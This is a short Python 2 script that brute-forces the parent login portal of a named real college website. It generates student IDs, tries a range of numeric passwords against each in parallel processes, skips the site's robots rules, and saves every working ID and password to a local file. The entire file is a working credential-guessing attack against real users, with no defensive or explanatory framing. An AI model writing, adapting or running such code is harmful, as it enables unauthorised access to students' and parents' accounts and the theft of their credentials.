__author__ = 'T90'
__version__ = '1.0.0'

import mechanize
import multiprocessing


def file(id, pass1):
	f = open("pass.txt", "a")
	line = id + ", " + pass1 + "\n"
	f.write(line)
	f.close()


def getdata(startpass, startid, yr):
	prev = 0
	for i in xrange(startid, startid + 140):
		id = "U" + yr + "0" + str(i)
		if i%100 == 0:
			print "Reached " + id
		for j in xrange(startpass, startpass + 3000):
			browser = mechanize.Browser(factory=mechanize.RobustFactory())
			browser.set_handle_robots(False)
			r = browser.open("http://rajagiritech.ac.in/stud/parent/")
			browser.select_form(nr=0)
			passw = str(j)
			browser.form["user"] = id
			browser.form["pass"] = passw
			browser.submit()
			if 'Parent.asp' in str(browser.geturl()):
				print id, passw
				file(id, passw)
				prev = j - startpass if prev == 0 else prev + 1
				break


if __name__ == '__main__':
	yrs = [str(i) for i in range(12, 13)]
	branches = [str(i) for i in range(1, 4)]
	p = []

	for yr in yrs:
		for branch in branches:
			temp = multiprocessing.Process(target=getdata, args=(2000, int(branch)*1000, yr,))
			p.append(temp)
			temp.start()

	for i in p:
		i.join()
